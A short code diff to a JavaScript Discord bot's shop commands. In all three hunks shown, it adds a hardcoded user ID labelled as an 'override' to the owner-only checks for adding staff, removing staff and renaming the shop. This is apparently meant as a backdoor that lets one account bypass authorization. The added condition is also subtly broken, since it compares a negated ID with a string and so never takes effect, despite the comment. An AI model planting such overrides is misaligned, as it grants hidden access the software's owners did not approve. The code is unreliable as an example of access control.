@@ -283,7 +283,7 @@ module.exports = {
     }
 
     if (subcommand === "add_staff") {
-      if (!isOwner) {
+      if (!isOwner || !interaction.user.id === "414204565840199690") { // Add override for 414204565840199690
         return interaction.reply({
           content: "❌ You must be the owner to add staff.",
           ephemeral: true,
@@ -313,7 +313,7 @@ module.exports = {
     }
 
     if (subcommand === "remove_staff") {
-      if (!isOwner) {
+      if (!isOwner || !interaction.user.id === "414204565840199690") { // Add override for 414204565840199690
         return interaction.reply({
           content: "❌ You must be the owner to remove staff.",
           ephemeral: true,
@@ -441,7 +441,7 @@ module.exports = {
     }
 
     if (subcommand === "change_name") {
-      if (!isOwner) {
+      if (!isOwner || !interaction.user.id === "414204565840199690") { // Add override for 414204565840199690
         return interaction.reply({
           content: "❌ You must be the owner to change the shop name.",
           ephemeral: true,
